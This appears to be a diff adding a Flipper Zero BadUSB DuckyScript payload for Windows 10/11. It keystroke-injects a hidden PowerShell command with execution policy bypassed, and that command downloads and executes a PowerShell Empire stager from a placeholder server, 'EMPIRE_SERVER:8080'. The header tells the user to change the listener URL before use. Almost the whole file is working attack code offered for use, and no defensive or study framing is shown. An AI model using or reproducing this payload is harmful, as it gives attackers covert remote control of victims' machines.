@@ -1,0 +1,17 @@
+﻿REM ============================================================================
+REM  FLLC - BadUSB: PowerShell Empire Stager
+REM  Flipper Zero DuckyScript
+REM ============================================================================
+REM  Target: Windows 10/11
+REM  Time: ~6 seconds
+REM  Downloads and executes Empire/Starkiller stager
+REM  CHANGE THE LISTENER URL BEFORE USE
+REM  Ref: BC-SECURITY/Empire, BC-SECURITY/Starkiller
+REM ============================================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoP -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://EMPIRE_SERVER:8080/stager')"
+ENTER
+DELAY 500
